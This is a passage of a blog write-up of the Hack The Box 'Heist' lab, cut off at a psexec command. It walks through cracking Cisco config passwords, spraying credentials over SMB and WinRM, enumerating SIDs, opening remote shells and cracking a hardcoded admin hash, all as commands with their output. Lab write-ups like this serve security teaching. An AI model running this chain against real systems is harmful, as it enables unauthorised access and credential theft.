&& this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Heist</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Heist</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 2, 2019, 12:27 AM +0800" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2348 words">13 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/heist.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>Always remember to map a domain name to the machine’s IP address to ease your rooting !</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.149 heist.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> heist.htb
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-08-17 10:31 EDT
+Nmap scan report <span class="k">for </span>heist.htb <span class="o">(</span>10.10.10.149<span class="o">)</span>
+Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 30s, deviation: 0s, median: 30s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2019-08-17 10:32:16
+|_  start_date: N/A
+5985/tcp  open  wsman
+49669/tcp open  unknown
+</pre></table></code></div></div><p>Lets first check out the <code class="language-plaintext highlighter-rouge">http</code> service on port 80.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/heist1.png" alt="" /></p><p>We don’t have any credentials so lets try to login as a guest.</p><p><code class="language-plaintext highlighter-rouge">/issues.php</code>:<br /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/heist2.png" alt="" /></p><p>This looks like a IT helpdesk ticketing system. It looks like <code class="language-plaintext highlighter-rouge">Hazard</code> is having issues with his cisco router and he has posted his configuration file.</p><p><code class="language-plaintext highlighter-rouge">/attachments/config.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!
+!
+ip ssh authentication-retries 5
+ip ssh version 2
+!
+!
+router bgp 100
+ synchronization
+ bgp log-neighbor-changes
+ bgp dampening
+ network 192.168.0.0Â mask 300.255.255.0
+ timers bgp 3 9
+ redistribute connected
+!
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.0.1
+!
+!
+access-list 101 permit ip any any
+dialer-list 1 protocol ip list 101
+!
+no ip http server
+no ip http secure-server
+!
+line vty 0 4
+ session-timeout 600
+ authorization exec SSH
+ transport input ssh
+</pre></table></code></div></div><p>First thing to note is</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>service password-encryption
+</pre></table></code></div></div><p>which tells us that all passwords in the configuration file are encrypted.</p><p>Next up, we get</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+</pre></table></code></div></div><p>which has a Type 5 encrypted password. To crack it, I will be using this <a href="https://github.com/axcheron/cisco_pwdecrypt">tool</a>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 cisco_pwdecrypt.py <span class="nt">-u</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">1</span><span class="se">\$</span><span class="s2">pdQG</span><span class="se">\$</span><span class="s2">o8nrSzsGXeaduXrjlvKc91"</span> <span class="nt">-d</span> /usr/share/wordlists/rockyou.txt
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing <span class="s1">'type 5'</span> hash...
+
+	Found 14344392 passwords to test.
+	Testing: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
+	Hash Type <span class="o">=</span> MD5
+	Salt <span class="o">=</span> pdQG
+	Hash <span class="o">=</span> o8nrSzsGXeaduXrjlvKc91
+
+	<span class="o">[</span>Status] 132/14344392 password tested...
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Password Found <span class="o">=</span> stealth1agent
+</pre></table></code></div></div><p>Lastly, we have</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+</pre></table></code></div></div><p>which both contains a username and a Type 7 encrypted password. To crack them, I will be using the same tool.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 cisco_pwdecrypt.py <span class="nt">-t</span> 0242114B0E143F015F5D1E161713
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Result: <span class="nv">$uperP</span>@ssword
+
+<span class="nv">$ </span>python3 cisco_pwdecrypt.py <span class="nt">-t</span> 02375012182C1A1D751618034F36415408
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Result: Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
+</pre></table></code></div></div><p>With all the credentials we have collected so far, lets create 2 files to store them.</p><p><code class="language-plaintext highlighter-rouge">user.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>Hazard
+hazard
+rout3r
+admin
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">pass.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>stealth1agent
+$uperP@ssword
+Q4)sJu\Y8qz*A3?d
+</pre></table></code></div></div><p>With some credentials, lets move on to the <code class="language-plaintext highlighter-rouge">smb</code> service on port 445. I will be using the <code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_login</code> module in Metasploit to test the different combinations.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole
+msf5 <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_login
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS heist.htb
+RHOSTS <span class="o">=&gt;</span> heist.htb
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_FILE user.txt
+USER_FILE <span class="o">=&gt;</span> user.txt
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASS_FILE pass.txt
+PASS_FILE <span class="o">=&gt;</span> pass.txt
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>THREADS 50
+THREADS <span class="o">=&gt;</span> 50
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>VERBOSE <span class="nb">false
+</span>VERBOSE <span class="o">=&gt;</span> <span class="nb">false
+</span>msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span>+] 10.10.10.149:445      - 10.10.10.149:445 - Success: <span class="s1">'.\Hazard:stealth1agent'</span>
+<span class="o">[</span>+] 10.10.10.149:445      - 10.10.10.149:445 - Success: <span class="s1">'.\hazard:stealth1agent'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> heist.htb:445         - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
+</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">hazard:stealth1agent</code>, lets see what we can access in the <code class="language-plaintext highlighter-rouge">smb</code> shares!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbmap <span class="nt">-H</span> heist.htb <span class="nt">-u</span> hazard <span class="nt">-p</span> stealth1agent
+<span class="o">[</span>+] Finding open SMB ports....
+<span class="o">[</span>+] User SMB session establishd on heist.htb...
+<span class="o">[</span>+] IP: heist.htb:445	Name: heist.htb                                         
+	Disk                                                  	Permissions
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS
+	C<span class="nv">$ </span>                                               	NO ACCESS
+	IPC<span class="nv">$ </span>                                             	READ ONLY
+</pre></table></code></div></div><p>I guess the <code class="language-plaintext highlighter-rouge">smb</code> service is a dead end? Maybe not. Using <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>’s <code class="language-plaintext highlighter-rouge">lookupsid.py</code>, we are able to enumerate for other users on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python lookupsid.py Hazard:stealth1agent@heist.htb
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Brute forcing SIDs at 10.10.10.149
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> StringBinding ncacn_np:10.10.10.149[<span class="se">\p</span>ipe<span class="se">\l</span>sarpc]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+501: SUPPORTDESK<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+503: SUPPORTDESK<span class="se">\D</span>efaultAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
+504: SUPPORTDESK<span class="se">\W</span>DAGUtilityAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
+513: SUPPORTDESK<span class="se">\N</span>one <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+1008: SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1009: SUPPORTDESK<span class="se">\s</span>upport <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1012: SUPPORTDESK<span class="se">\C</span>hase <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1013: SUPPORTDESK<span class="se">\J</span>ason <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</pre></table></code></div></div><p>From this, we are able to find out that the domain is <code class="language-plaintext highlighter-rouge">SUPPORTDESK</code>. With these new users, lets update our <code class="language-plaintext highlighter-rouge">user.txt</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>Hazard
+hazard
+rout3r
+admin
+Chase
+Jason
+support
+Administrator
+</pre></table></code></div></div><p>And run the <code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_login</code> module again.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>DOMAIN SUPPORTDESK
+DOMAIN <span class="o">=&gt;</span> SUPPORTDESK
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span>+] 10.10.10.149:445      - 10.10.10.149:445 - Success: <span class="s1">'SUPPORTDESK\Hazard:stealth1agent'</span>
+<span class="o">[</span>+] 10.10.10.149:445      - 10.10.10.149:445 - Success: <span class="s1">'SUPPORTDESK\hazard:stealth1agent'</span>
+<span class="o">[</span>+] 10.10.10.149:445      - 10.10.10.149:445 - Success: <span class="s1">'SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> heist.htb:445         - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
+</pre></table></code></div></div><p>Alright! We got another set of credentials! Lets try to access the <code class="language-plaintext highlighter-rouge">smb</code> shares using <code class="language-plaintext highlighter-rouge">Chase:Q4)sJu\Y8qz*A3?d</code>!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbmap <span class="nt">-H</span> heist.htb <span class="nt">-u</span> Chase <span class="nt">-p</span> <span class="s2">"Q4)sJu</span><span class="se">\Y</span><span class="s2">8qz*A3?d"</span> <span class="nt">-d</span> SUPPORTDESK
+<span class="o">[</span>+] Finding open SMB ports....
+<span class="o">[</span>+] User SMB session establishd on heist.htb...
+<span class="o">[</span>+] IP: heist.htb:445	Name: heist.htb                                         
+	Disk                                                  	Permissions
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS
+	C<span class="nv">$ </span>                                               	NO ACCESS
+	IPC<span class="nv">$ </span>                                             	READ ONLY
+</pre></table></code></div></div><p>Still nothing? I guess the <code class="language-plaintext highlighter-rouge">smb</code> service really is a dead end :(</p><p>If we go back to our reconnaissance results, there is actually one more service on port 5985: <code class="language-plaintext highlighter-rouge">wsman</code>. After some research, the <code class="language-plaintext highlighter-rouge">wsman</code> service is the <code class="language-plaintext highlighter-rouge">WinRM</code> service on the machine. Could we possbily use it to remotely execute commands on the machine? But first, we need to know what credentials we can use by using the <code class="language-plaintext highlighter-rouge">auxiliary/scanner/winrm/winrm_login</code> module in Metasploit.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> use auxiliary/scanner/winrm/winrm_login
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS heist.htb
+RHOSTS <span class="o">=&gt;</span> heist.htb
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_FILE username.txt
+USER_FILE <span class="o">=&gt;</span> username.txt
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASS_FILE password.txt
+PASS_FILE <span class="o">=&gt;</span> password.txt
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>THREADS 50
+THREADS <span class="o">=&gt;</span> 50
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>VERBOSE <span class="nb">false
+</span>VERBOSE <span class="o">=&gt;</span> <span class="nb">false
+</span>msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>DOMAIN SUPPORTDESK
+DOMAIN <span class="o">=&gt;</span> SUPPORTDESK
+msf5 auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span>+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
+</pre></table></code></div></div><h1 id="usertxt">user.txt</h1><p>Okay… So the same <code class="language-plaintext highlighter-rouge">Chase</code> user have access to both the <code class="language-plaintext highlighter-rouge">smb</code> and <code class="language-plaintext highlighter-rouge">WinRM</code> service. To establish a shell, I used <code class="language-plaintext highlighter-rouge">Alamot</code>’s <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">winrm_shell.rb</a> with the following configuration settings:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nb">require</span> <span class="s1">'winrm'</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> 
+  <span class="ss">endpoint: </span><span class="s1">'http://10.10.10.149:5985/wsman'</span><span class="p">,</span>
+  <span class="ss">transport: :ssl</span><span class="p">,</span>
+  <span class="ss">user: </span><span class="s1">'SUPPORTDESK\Chase'</span><span class="p">,</span>
+  <span class="ss">password: </span><span class="s1">'Q4)sJu\Y8qz*A3?d'</span><span class="p">,</span>
+  <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
+<span class="p">)</span>
+</pre></table></code></div></div><p>And now we execute the <code class="language-plaintext highlighter-rouge">WinRM</code> shell…</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby winrm_shell.rb
+PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK Documents&gt; <span class="nb">cd</span> ..
+PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK Chase&gt; <span class="nb">cd </span>Desktop
+PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK Desktop&gt; <span class="nb">dir
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        4/22/2019   9:08 AM            121 todo.txt
+<span class="nt">-a----</span>        4/22/2019   9:07 AM             32 user.txt
+                                                                                                                   
+PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK Desktop&gt; more user.txt
+a127XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h1 id="roottxt-1">root.txt (1)</h1><p>When I first did this machine, I found the <code class="language-plaintext highlighter-rouge">SHA-256</code> hash of the Administrator’s password which I was able to somehow crack it using an online website.</p><p>From what we know, there was a <code class="language-plaintext highlighter-rouge">IIS</code> web server running on port 80 so I checked out <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK inetpub&gt; <span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 78E3-E62D
+
+ Directory of C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
+
+04/21/2019  05:42 PM    &lt;DIR&gt;          <span class="nb">.</span>
+04/21/2019  05:42 PM    &lt;DIR&gt;          ..
+04/21/2019  05:41 PM    &lt;DIR&gt;          attachments
+04/21/2019  05:41 PM    &lt;DIR&gt;          css
+04/21/2019  11:51 AM             1,240 errorpage.php
+04/21/2019  05:41 PM    &lt;DIR&gt;          images
+04/21/2019  11:33 AM               279 index.php
+04/22/2019  08:38 AM             3,034 issues.php
+04/21/2019  05:41 PM    &lt;DIR&gt;          js
+04/22/2019  06:48 AM             2,657 login.php
+               4 File<span class="o">(</span>s<span class="o">)</span>          7,210 bytes
+               6 Dir<span class="o">(</span>s<span class="o">)</span>   7,923,224,576 bytes free
+</pre></table></code></div></div><p>I skimmed through the pages until I came across <code class="language-plaintext highlighter-rouge">login.php</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'login_username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'login_password'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'login_username'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'admin@support.htb'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span> <span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'login_password'</span><span class="p">])</span> <span class="o">===</span> 
+		<span class="s1">'91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"valid"</span><span class="p">;</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: issues.php'</span><span class="p">);</span> 
+        <span class="p">}</span>
+        <span class="k">else</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: errorpage.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span><span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'guest'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'guest'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'true'</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'guest'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"valid"</span><span class="p">;</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: issues.php'</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">SHA-256</code> hash of the admin’s password was hardcoded in <code class="language-plaintext highlighter-rouge">login.php</code>. I immediately tried different online password cracking websites until I came across this <a href="https://md5decrypt.net/en/Sha256">website</a>. I supplied the hash and got the password <code class="language-plaintext highlighter-rouge">4dD!5}x/re8]FBuZ</code>.</p><p>Using <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>’s <code class="language-plaintext highlighter-rouge">psexec.py</code>, I was able to establish a shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python psexec.py Administrator:<span class="s1">'4dD!5}x/re8]FBuZ'</span>@heist.htb
